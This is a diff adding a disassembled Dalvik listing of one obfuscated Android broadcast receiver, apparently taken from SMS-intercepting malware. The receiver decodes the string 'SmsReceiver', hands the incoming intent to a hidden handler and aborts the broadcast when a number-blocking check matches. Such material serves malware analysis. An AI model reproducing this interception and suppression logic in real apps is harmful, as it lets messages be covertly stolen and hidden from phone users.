@@ -1,0 +1,43 @@
+# Ltev/piqgahor/lnHIYIDJj;->onReceive(Landroid/content/Context; Landroid/content/Intent;)V [access_flags=public]
+#
+# Parameters:
+# - local registers: v0...v1
+# - v2:android.content.Context
+# - v3:android.content.Intent
+#
+# - return:void
+
+onReceive-BB@0x0 : [ onReceive-BB@0x4 onReceive-BB@0x8 ]
+	0       (00000000) if-eqz               v2, +4
+
+onReceive-BB@0x4 : [ onReceive-BB@0x8 onReceive-BB@0xa ]
+	1       (00000004) if-nez               v3, +3
+
+onReceive-BB@0x8 : 
+	2       (00000008) return-void          
+
+onReceive-BB@0xa : [ onReceive-BB@0x32 onReceive-BB@0x8 ]
+	3       (0000000a) const/16             v0, 12
+	4       (0000000e) new-array            v0, v0, [I
+	5       (00000012) fill-array-data      v0, +17 (0x40)
+	6       (00000018) invoke-static        v0, Ltev/piqgahor/WqukitNJL;->ZkeTGysUO016([I)Ljava/lang/String;
+	7       (0000001e) move-result-object   v0
+	8       (00000020) invoke-static        v2, v0, v3, Ltev/piqgahor/jzVO9lP4;->yStpazw33441uh(Landroid/content/Context; Ljava/lang/String; Landroid/content/Intent;)V
+	9       (00000026) invoke-static        v3, Ltev/piqgahor/mlDMsT43cl;->IsNumBlock(Landroid/content/Intent;)Z
+	10      (0000002c) move-result          v0
+	11      (0000002e) if-eqz               v0, -13
+
+onReceive-BB@0x32 : [ onReceive-BB@0x8 ]
+	12      (00000032) invoke-virtual       v1, Ltev/piqgahor/lnHIYIDJj;->abortBroadcast()V
+	13      (00000038) goto                 -18
+	32:37
+	(Ljava/lang/Exception; -> 3a onReceive-BB@0x3a)
+
+onReceive-BB@0x3a : [ onReceive-BB@0x8 ]
+	14      (0000003a) move-exception       v0
+	15      (0000003c) goto                 -1a
+
+onReceive-BB@0x3e : 
+	16      (0000003e) nop                  
+	17      (00000040) fill-array-data-payload bytearray(b'\x07\x00\x00\x00Z\x00\x00\x00t\x00\x00\x00z\x00\x00\x00Y\x00\x00\x00l\x00\x00\x00j\x00\x00\x00l\x00\x00\x00p\x00\x00\x00}\x00\x00\x00l\x00\x00\x00y\x00\x00\x00') | \x07\x00\x00\x00\x5a\x00\x00\x00\x74\x00\x00\x00\x7a\x00\x00\x00\x59\x00\x00\x00\x6c\x00\x00\x00\x6a\x00\x00\x00\x6c\x00\x00\x00\x70\x00\x00\x00\x7d\x00\x00\x00\x6c\x00\x00\x00\x79\x00\x00\x00
+
